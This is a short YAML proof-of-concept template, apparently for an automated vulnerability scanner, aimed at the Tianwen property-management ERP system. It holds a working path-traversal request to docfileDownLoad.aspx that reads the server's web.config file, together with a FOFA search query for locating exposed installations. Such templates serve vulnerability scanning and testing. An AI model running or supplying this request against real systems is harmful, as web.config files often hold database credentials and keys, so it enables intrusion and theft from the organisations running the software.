id: poc-yaml-tianwen-wuye-erp-docfiledownload-file-read
info:
  name: 天问物业ERP系统 docfileDownLoad.aspx 任意文件读取漏洞
  severity: high
  tags:
  - 文件读取
  finger: 天问物业ERP系统
  fofa: body="天问物业ERP系统"
requests:
- method: GET
  path: /HM/M_Main/WorkGeneral/docfileDownLoad.aspx?AdjunctFile=../web.config
  expression: 'status_code == 200 &&

    contains(headers,"filename=web.config") &&

    contains(body,"<appSettings>") &&

    contains(body,"<configuration>")

    '
variables: {}
transport: http
